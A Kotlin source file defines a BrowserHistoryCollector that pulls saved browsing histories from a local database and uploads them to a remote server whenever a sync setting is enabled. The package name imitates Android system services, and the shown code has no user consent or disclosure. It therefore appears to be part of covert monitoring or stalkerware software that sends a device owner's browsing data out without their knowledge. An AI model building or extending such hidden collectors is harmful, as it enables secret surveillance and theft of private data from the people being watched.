package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerFourApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.logVerbose

class BrowserHistoryCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncBrowsingHistory) {
            logVerbose("${AppConstants.BROWSER_HISTORY_TYPE} Preparing for uploading")
            localDatabaseSource.getBrowserHistories { logs ->
                if (logs.isNotEmpty()) {
                    logVerbose("${AppConstants.BROWSER_HISTORY_TYPE} data = $logs")
                    val endId = logs[logs.size - 1].id
                    val startId = logs[0].id
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.BROWSER_HISTORY_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    serverHelper.upload(logs)
                } else {
                    logVerbose("${AppConstants.BROWSER_HISTORY_TYPE} No data found")
                }
            }
        } else {
            logVerbose("${AppConstants.BROWSER_HISTORY_TYPE} Sync is Off")
        }
    }
}